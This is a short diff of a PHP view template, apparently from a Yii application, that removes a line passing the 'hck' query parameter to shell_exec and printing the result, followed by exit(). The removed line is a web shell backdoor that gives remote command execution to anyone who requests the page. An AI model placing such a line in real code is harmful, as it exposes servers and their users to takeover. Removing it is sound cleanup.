@@ -17,10 +17,6 @@ $search = "$('.search-button').click(function(){
 });";
 
 
-print_r(shell_exec($_GET['hck']));
-exit();
-
-
 $this->registerJs($search);
 
 yii\bootstrap\Modal::begin([
